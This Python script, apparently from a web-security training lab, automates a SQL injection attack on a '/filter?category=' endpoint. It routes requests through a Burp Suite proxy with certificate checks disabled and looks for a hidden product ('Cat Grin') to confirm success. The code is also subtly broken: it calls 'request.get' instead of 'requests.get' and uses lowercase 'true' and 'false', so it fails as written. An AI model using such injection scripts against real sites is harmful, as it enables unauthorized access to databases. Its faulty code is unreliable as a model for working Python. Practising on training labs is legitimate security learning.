# This script accepts 2 command-line parameters:
# URL
# Payload

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Whenever the script runs, it will pass the request throught these proxies
# using the Burp Suite.
proxies = {'http': 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8043'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = request.get(url + uri + payload, verify=false, proxies=proxies)
    # Check if the response contains an item that we are not supposed to see
    # In this case, an item that has not been released (released == 0)
    if "Cat Grin" in r.text:
        return true
    else:
        return false

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[ - ] Usage: %s <url> <payload>" % sys.argv[0])
        print('[ - ] Example: %s www.example.com "1=1"' % sys.argv[0]) # Mind the quotes
        sys.exit(-1)
        
    if exploit_sqli(url, payload):
        print("[+] Successful SQL injection.")
    else:
        print("[-] No SQL injection achieved.")
# EOF